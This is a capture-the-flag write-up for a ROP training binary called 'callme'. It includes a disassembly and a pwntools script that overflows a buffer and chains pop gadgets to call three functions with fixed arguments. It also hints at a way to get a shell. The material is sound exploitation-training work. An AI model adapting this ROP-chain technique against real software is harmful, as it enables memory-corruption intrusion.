You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. **For the x86_64 binary** double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

was provided with a file called `callme`. 

```
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:	push   rbp
   0x00000000004008f3 <+1>:	mov    rbp,rsp
   0x00000000004008f6 <+4>:	mov    edx,0x6
   0x00000000004008fb <+9>:	mov    esi,0x5
   0x0000000000400900 <+14>:	mov    edi,0x4
   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:	mov    edx,0x6
   0x000000000040090f <+29>:	mov    esi,0x5
   0x0000000000400914 <+34>:	mov    edi,0x4
   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:	mov    edi,0x1
   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
End of assembler dump.
```

`script.py`:

```python
from pwn import * 

p = process('./callme')

useful_function = 0x4008f2

ret_gadget = 0x00000000004006be 
rdi_rsi_rdx_gadget = 0x000000000040093c 

callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006f0

dead = 0xdeadbeefdeadbeef 
cafe = 0xcafebabecafebabe 
dood = 0xd00df00dd00df00d

payload = b'A'*40 + p64(ret_gadget) + p64(rdi_rsi_rdx_gadget) + p64(dead) + p64(cafe) + p64(dood) + p64(callme_one)
payload += p64(rdi_rsi_rdx_gadget) + p64(dead) + p64(cafe) + p64(dood) + p64(callme_two)
payload += p64(rdi_rsi_rdx_gadget) + p64(dead) + p64(cafe) + p64(dood) + p64(callme_three)

p.sendline(payload)

p.interactive()
```

### Alternate solution

Once you've solved this challenge in the intended way you can revisit it and solve it using a different technique that can even get you a shell rather than just printing the flag. If you're out of ideas though, consider making it to the "pivot" challenge first so that you're equipped with the knowledge to take this alternate path.


## Notes: 

Strings, but better:  

```
$ rabin2 -z write4 
```

To look at PLT entries: 

```
$ rabin2 -i write4
```


